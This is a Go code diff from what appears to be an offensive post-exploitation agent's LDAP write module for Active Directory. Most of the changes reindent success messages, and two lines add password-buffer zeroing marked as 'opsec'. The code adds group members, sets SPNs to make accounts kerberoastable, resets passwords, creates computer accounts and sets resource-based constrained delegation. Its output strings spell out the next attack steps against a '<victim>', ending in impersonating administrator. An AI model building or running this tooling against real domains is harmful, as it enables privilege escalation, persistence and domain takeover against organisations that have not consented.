@@ -204,9 +204,9 @@ func ldapAddMember(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs.C
 	}
 
 	return successf("[*] LDAP Group Membership Modification (T1098)\n"+
-			"[+] Added:  %s\n"+
-			"[+] To:     %s\n"+
-			"[+] Server: %s\n", targetDN, groupDN, args.Server)
+		"[+] Added:  %s\n"+
+		"[+] To:     %s\n"+
+		"[+] Server: %s\n", targetDN, groupDN, args.Server)
 }
 
 func ldapRemoveMember(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs.CommandResult {
@@ -232,9 +232,9 @@ func ldapRemoveMember(conn *ldap.Conn, args ldapWriteArgs, baseDN string) struct
 	}
 
 	return successf("[*] LDAP Group Membership Modification (T1098)\n"+
-			"[+] Removed: %s\n"+
-			"[+] From:    %s\n"+
-			"[+] Server:  %s\n", targetDN, groupDN, args.Server)
+		"[+] Removed: %s\n"+
+		"[+] From:    %s\n"+
+		"[+] Server:  %s\n", targetDN, groupDN, args.Server)
 }
 
 func ldapSetAttr(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs.CommandResult {
@@ -264,11 +264,11 @@ func ldapSetAttr(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs.Com
 	}
 
 	return successf("[*] LDAP Attribute Modification (T1098)\n"+
-			"[+] Target:    %s\n"+
-			"[+] Attribute: %s\n"+
-			"[+] Value:     %s\n"+
-			"[+] Operation: REPLACE\n"+
-			"[+] Server:    %s\n", targetDN, args.Attr, valDisplay, args.Server)
+		"[+] Target:    %s\n"+
+		"[+] Attribute: %s\n"+
+		"[+] Value:     %s\n"+
+		"[+] Operation: REPLACE\n"+
+		"[+] Server:    %s\n", targetDN, args.Attr, valDisplay, args.Server)
 }
 
 func ldapAddAttr(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs.CommandResult {
@@ -298,11 +298,11 @@ func ldapAddAttr(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs.Com
 	}
 
 	return successf("[*] LDAP Attribute Modification (T1098)\n"+
-			"[+] Target:    %s\n"+
-			"[+] Attribute: %s\n"+
-			"[+] Value:     %s\n"+
-			"[+] Operation: ADD\n"+
-			"[+] Server:    %s\n", targetDN, args.Attr, valDisplay, args.Server)
+		"[+] Target:    %s\n"+
+		"[+] Attribute: %s\n"+
+		"[+] Value:     %s\n"+
+		"[+] Operation: ADD\n"+
+		"[+] Server:    %s\n", targetDN, args.Attr, valDisplay, args.Server)
 }
 
 func ldapRemoveAttr(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs.CommandResult {
@@ -335,11 +335,11 @@ func ldapRemoveAttr(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs.
 	}
 
 	return successf("[*] LDAP Attribute Modification (T1098)\n"+
-			"[+] Target:    %s\n"+
-			"[+] Attribute: %s\n"+
-			"[+] Value:     %s\n"+
-			"[+] Operation: DELETE\n"+
-			"[+] Server:    %s\n", targetDN, args.Attr, valDisplay, args.Server)
+		"[+] Target:    %s\n"+
+		"[+] Attribute: %s\n"+
+		"[+] Value:     %s\n"+
+		"[+] Operation: DELETE\n"+
+		"[+] Server:    %s\n", targetDN, args.Attr, valDisplay, args.Server)
 }
 
 func ldapSetSPN(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs.CommandResult {
@@ -360,11 +360,11 @@ func ldapSetSPN(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs.Comm
 	}
 
 	return successf("[*] LDAP SPN Modification (T1134)\n"+
-			"[+] Target: %s\n"+
-			"[+] SPN:    %s\n"+
-			"[+] Server: %s\n"+
-			"\n[!] Account is now kerberoastable — use kerberoast to extract TGS hash.\n",
-			targetDN, args.Value, args.Server)
+		"[+] Target: %s\n"+
+		"[+] SPN:    %s\n"+
+		"[+] Server: %s\n"+
+		"\n[!] Account is now kerberoastable — use kerberoast to extract TGS hash.\n",
+		targetDN, args.Value, args.Server)
 }
 
 func ldapToggleAccount(conn *ldap.Conn, args ldapWriteArgs, baseDN string, disable bool) structs.CommandResult {
@@ -419,10 +419,10 @@ func ldapToggleAccount(conn *ldap.Conn, args ldapWriteArgs, baseDN string, disab
 	}
 
 	return successf("[*] LDAP Account Control Modification (T1098)\n"+
-			"[+] Target: %s\n"+
-			"[+] Action: %s\n"+
-			"[+] UAC:    0x%04X → 0x%04X\n"+
-			"[+] Server: %s\n", targetDN, actionStr, uac, newUAC, args.Server)
+		"[+] Target: %s\n"+
+		"[+] Action: %s\n"+
+		"[+] UAC:    0x%04X → 0x%04X\n"+
+		"[+] Server: %s\n", targetDN, actionStr, uac, newUAC, args.Server)
 }
 
 func ldapSetPassword(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs.CommandResult {
@@ -446,6 +446,7 @@ func ldapSetPassword(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs
 		utf16Pwd[i*2] = byte(c)
 		utf16Pwd[i*2+1] = 0
 	}
+	defer structs.ZeroBytes(utf16Pwd) // opsec: zero UTF-16 password buffer
 
 	modReq := ldap.NewModifyRequest(targetDN, nil)
 	modReq.Replace("unicodePwd", []string{string(utf16Pwd)})
@@ -485,6 +486,7 @@ func ldapAddComputer(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs
 		utf16Pwd[i*2] = byte(c)
 		utf16Pwd[i*2+1] = 0
 	}
+	defer structs.ZeroBytes(utf16Pwd) // opsec: zero UTF-16 password buffer
 
 	addReq := ldap.NewAddRequest(computerDN, nil)
 	addReq.Attribute("objectClass", []string{"top", "person", "organizationalPerson", "user", "computer"})
@@ -528,15 +530,15 @@ func ldapAddComputer(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs
 	}
 
 	return successf("[*] LDAP Computer Account Creation (T1136.002)\n"+
-			"[+] DN:            %s\n"+
-			"[+] sAMAccountName: %s\n"+
-			"[+] Password:      %s\n"+
-			"[+] UAC:           %s\n"+
-			"[+] Server:        %s\n"+
-			"%s"+
-			"\n[!] Next: ldap-write -action set-rbcd -target <victim> -value %s\n"+
-			"[!] Then: ticket -action s4u -target <victim> -impersonate administrator\n",
-			computerDN, samName, pwdStatus, uacStr, args.Server, extraNote, samName)
+		"[+] DN:            %s\n"+
+		"[+] sAMAccountName: %s\n"+
+		"[+] Password:      %s\n"+
+		"[+] UAC:           %s\n"+
+		"[+] Server:        %s\n"+
+		"%s"+
+		"\n[!] Next: ldap-write -action set-rbcd -target <victim> -value %s\n"+
+		"[!] Then: ticket -action s4u -target <victim> -impersonate administrator\n",
+		computerDN, samName, pwdStatus, uacStr, args.Server, extraNote, samName)
 }
 
 func ldapDeleteObject(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs.CommandResult {
@@ -555,8 +557,8 @@ func ldapDeleteObject(conn *ldap.Conn, args ldapWriteArgs, baseDN string) struct
 	}
 
 	return successf("[*] LDAP Object Deletion\n"+
-			"[+] Deleted: %s\n"+
-			"[+] Server:  %s\n", targetDN, args.Server)
+		"[+] Deleted: %s\n"+
+		"[+] Server:  %s\n", targetDN, args.Server)
 }
 
 func ldapSetRBCD(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs.CommandResult {
@@ -637,9 +639,9 @@ func ldapClearRBCD(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs.C
 	}
 
 	return successf("[*] LDAP RBCD Cleared\n"+
-			"[+] Target: %s\n"+
-			"[+] Cleared: msDS-AllowedToActOnBehalfOfOtherIdentity\n"+
-			"[+] Server: %s\n", targetDN, args.Server)
+		"[+] Target: %s\n"+
+		"[+] Cleared: msDS-AllowedToActOnBehalfOfOtherIdentity\n"+
+		"[+] Server: %s\n", targetDN, args.Server)
 }
 
 // buildRBCDSecurityDescriptor creates a self-relative security descriptor
